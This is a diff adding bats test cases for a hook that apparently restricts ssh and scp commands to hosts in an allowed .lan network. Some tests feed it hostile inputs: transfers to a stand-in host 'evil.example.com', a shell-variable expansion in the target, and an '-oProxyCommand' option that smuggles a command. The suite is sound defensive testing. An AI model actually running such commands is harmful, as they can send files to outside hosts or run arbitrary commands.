@@ -207,6 +207,59 @@ with_valid_key() {
     [ "${status}" -eq 0 ]
 }
 
+@test "a double-quoted target with no expansion inside is treated as literal, not marker" {
+    with_valid_key
+    run_hook 'ssh "dns-01.lan"'
+    [ "${status}" -eq 0 ]
+}
+
+@test "a single-quoted target with no expansion inside is treated as literal" {
+    with_valid_key
+    run_hook "ssh 'dns-01.lan'"
+    [ "${status}" -eq 0 ]
+}
+
+@test "a double-quoted non-.lan target is still correctly rejected" {
+    with_valid_key
+    run_hook 'ssh "evil.example.com"'
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'not in the allowed .lan network'* ]]
+}
+
+@test "a double-quoted scp remote destination with no expansion is treated as literal" {
+    with_valid_key
+    run_hook 'scp file.txt "user@dns-01.lan:/tmp/"'
+    [ "${status}" -eq 0 ]
+}
+
+@test "a double-quoted target mixing literal text with an expansion still fails closed" {
+    with_valid_key
+    # shellcheck disable=SC2016  # literal $HOST — must reach the hook unexpanded
+    run_hook 'ssh "dns-01.$HOST"'
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'non-literal argument'* ]]
+}
+
+@test "scp -- end-of-options switches to literal parsing, so a dash-prefixed filename after it is not treated as a flag" {
+    with_valid_key
+    run_hook "scp -- -oddfile.txt user@dns-01.lan:/tmp/"
+    [ "${status}" -eq 0 ]
+}
+
+@test "scp -- does not exempt a genuinely dangerous flag before it" {
+    with_valid_key
+    run_hook "scp -oProxyCommand=x -- file.txt user@dns-01.lan:/tmp/"
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'-o is not permitted'* ]]
+}
+
+@test "scp -- followed by a non-.lan remote target after a dash-prefixed local file is still rejected" {
+    with_valid_key
+    run_hook "scp -- -oddfile.txt user@evil.example.com:/tmp/"
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'not in the allowed .lan network'* ]]
+}
+
 @test "scp user@host.lan:path remote destination is allowed" {
     with_valid_key
     run_hook "scp file.txt user@dns-01.lan:/tmp/"
